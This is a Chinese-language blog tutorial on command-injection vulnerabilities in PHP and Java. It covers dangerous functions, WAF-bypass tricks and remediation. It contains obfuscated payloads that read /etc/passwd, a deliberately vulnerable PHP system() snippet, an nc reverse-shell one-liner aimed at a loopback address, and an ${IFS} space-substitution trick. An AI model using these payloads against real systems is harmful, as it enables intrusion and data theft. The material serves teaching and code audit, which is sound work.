# 命令执行漏洞


## 原理

指应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，Java中可以执行系统命令的函数有`Runtime.getRuntime.exec()`，`PrpcessBuilder.start()`(第一个是jdk1.5前。第二个是jdk1.5后)。当用户能控制这些函数的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。



## 利用条件

1. 应用调用执行系统命令的函数
2. 将用户输入作为系统命令的参数拼接到了命令行中
3. 没有对用户输入进行过滤或过滤不严





## 危害

1. 继承Web服务程序的权限去执行系统命令或读写文件
2. 反弹shell
3. 控制整个网站甚至服务器
4. 进一步内网渗透
5. 等等（都能执行系统命令了，危害肯定超级大了）





## 常见连接符

| 符号 | 含义                                                         |
| ---- | ------------------------------------------------------------ |
| \|   | 前面命令输出结果作为后面命令的输入内容                       |
| \|\| | 前面命令执行失败时才执行后面的命令（具有短路效果，左边是true，右边不执行） |
| &    | 前面命令执行后继续执行后面的命令（无论左边是false还是true，右边都执行） |
| &&   | 前面命令执行成功时才执行后面的命令（具有短路效果，左边是false，右边不执行） |





## 函数

### php中

在php下，允许命令执行的函数有：

```bash
eval（）
assert（）
preg_replace（）
call_user_func（）
```

如果页面中存在这些函数并且对于用户的输入没有做严格的过滤，那么就可能造成远程命令执行漏洞

其他函数

```bash
ob_start（）、unserialize（）、creat_function（）
、usort（）、uasort（）、uksort（）、
array_filter（）、
array_reduce（）、
array_map（）......
```

```bash
system（）
exec（）
shell_exec（）
passthru（）
pcntl_exec（）
popen（）
proc_open（）
反引号
......
```





## waf绕过

#### 1.通配符

```bash
ls-l
#使用通配符
/?in/?s-l

/???/??t /??c/p???w?
#有时候WAF不允许使用太多的？号
/?in/cat/?tc/p?sswd


```



#### 2.连接符

```bash
# 在bash的操作环境中，连接符，如'

echo test
# 使用连接符
echo te'st
>'
test
# 注意闭合！

# 如读取/etc/passwd
/'b'i'n'/'c'a't'/'e't'c'/'p'a's's'w'd

# 其他字符
双引号 "

反斜杠 \
```



#### 3.未初始化的bash变量

在bash环境中允许我们使用未初始化的bash变量，如 $a ,$b,$c

未初始化的变量值都是`null`

```bash
# 读取/etc/passwd:
cat$a /etc$a/passwd$a
```

![读取成功](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/img/image-20220118110911969.png)



```php
#测试WAF
#测试代码：
<?php
    echo "OK";
    system('dig'.$_GET['host']);
?>
```



```bash
www.baidu.com;$s/bin$s/which$s nc$s

# 反弹shell:
/bin$s/nc$s -e/bin$s/bash$s 2130706433 3737
```







## Java代码审计

### 常用方法

Java中可以执行系统命令的函数有：

#### 1.`Runtime.getRuntime.exec()`

```java
Runtime runtime = Runtime.getRuntime();
Process process = runtime.exec(command);
```



exec的使用方式有以下六种：

```java
// 在单独的进程中执行指定的字符串命令
public Process exec(String command)
    
// 在单独的进程中执行指定的命令和参数
public Process exec(String[] cmdarray)

// 在具有指定环境的单独进程中执行指定的命令和参数
public Process exec(String[] cmdarray, String[] envp)
    
// 在具有指定环境和工作目录的单独进程中执行指定的命令和参数
public Process exec(String[] cmdarray, String[] envp, File dir)
    
 
// 在具有指定环境的单独进程中执行指定的字符串命令
public Process exec(String command, String[] envp)
    
// 在具有指定环境和工作目录的单独进程中执行指定的字符串命令
public Process exec(String command, String[] envp, File dir)
   
```



exec在执行系统命令时，当**传入的参数为`字符串参数`和`数组参数`时，有不同的返回结果：**

首先利用exec()方法执行字符串命令，如：`Process proc = Rumtime.getRuntime.exec("ping 127.0.0.1");`执行成功。

利用exec()方法执行多个命令或命令中存在`>`或`|`等特殊字符时：`Process proc = Rumtime.getRuntime.exec("ping 127.0.0.1ls");`执行失败。

然后当传入的命令改为数组参数时，发现ping和id两个命令可以正常执行：

```java
String [] cmd = {"/bin/bash", "-c", "ping -t 3 127.0.0.1;id"};
Process proc = Runtime.getRuntime().exec(cmd);
```



**原因分析：**

当跟进exec函数，发现调用的是:

```java
public Process exec(String cmdarray[]) throws IOException {
    return exec(cmdarray, null, null);
}
```

跟入exec方法，发现调用的是这种参数的方法：

```java
public Process exec(String[] cmdarray, String[] envp, File dir)
```

那么为什么传入字符串和传入数组会造成不同的结果呢？

可以看到如下对字符串类型参数进行处理的代码：

![字符串参数的exec的实现](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/img/image-20220118104123543.png)

`StringTokenizer`对传入的字符串命令参数进行处理，然后再调用` exec(String[] cmdarray, String[] envp, File dir)`

![image-20220118104339231](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/img/image-20220118104339231.png)

关键点就在于`StringTokenizer`如何进行处理的，跟进去发现：

![StringTokenizer](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/img/image-20220118104549229.png)

会用空格和换行符tab符等空白符`\t\n\r\f`对传入的字符串进行分割，返回一个`cmdarray`数组，其中cmdarray的第一个要素为执行的命令，该处理导致了再调用exec方法执行命令时，传入字符串参数和数组参数时的返回结果不同。

例如当传入参数分别如下：

```java
// exec执行字符串参数
String cmd1 = "/bin/bash -c \"ping -t 3 127.0.0.1;id\";

// exec执行字数组参数
String cmd1 = {"/bin/bash", "-c",  "ping -t 3 127.0.0.1;id"};
    
```

当执行字符串参数时，经过StringTokenizer类后拆分为：

```java
{"/bin/bash", "-c",  "ping", "-t", "3", "127.0.0.1;id", """};
```

这就改变了原有的执行命令的语义，导致命令不能正常执行；

而当执行数组参数值，发现没有进入StringTokenizer类。







如果exec方法执行的参数是字符串参数，参数中的空格就会经过`StringTokenizer`处理，处理完成后会改变原有的语义导致命令无法正常执行，要想执行命令必须绕过`StringTokenizer`，即**找到代替空格的字符**就可以，这里比如：`${IFS}`, `$IFS$9`等。

但是url中因为RFC规范，只允许包含数字、字母和四个特殊字符`-_.~`，不允许出现前面的`{}`，所以对`{}`进行url编码即可。





**Java中，连接符的使用存在一定局限**。例如：

```java
...
Process process = Runtime.getRuntime().exec("ping" + url);
...
```

以上代码中使用ping来诊断网络。当黑客输出`www.baidu.com&ipconfig`时，拼接处的系统命令为`www.baidu.com&ipconfig`，该命令在命令行终端可以执行。但是在Java运行环境下却执行失败。在Java中，`www.baidu.com&ipconfig`被当做一个完整字符串而非两条命令，因为该示例代码并不存在命令执行漏洞。





#### 2.`ProcessBuilder.start()`

```java
ProcessBuilder pb = new ProcessBuilder("命令", "参数");
Process process = pb.start()
```



ProcessBuilder.start()执行系统命令时，并没有获得Unix或Linux Shell。因此要使用Unix/Linux管道之类的功能，必须先调用一个shell程序，比如：想要通过Java执行`ls;id`这个命令，必须先调用shell程序`/bin/sh`才能执行，即：`/bin/sh -c "ls;id"`













## 修复

- 开发人员应将现有API用于其语言。如不用`Runtime.exec()`发出`mail`的命令，而使用位于`java.mail`的可用api
- 如果不存在这种api，应进行查找和过滤恶意字符
- 对PHP语言来说，不能完全控制的危险函数最好不要使用





































---

> 作者: [剑胆琴心](http://shuai06.github.io)  
> URL: https://shuai06.github.io/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/  

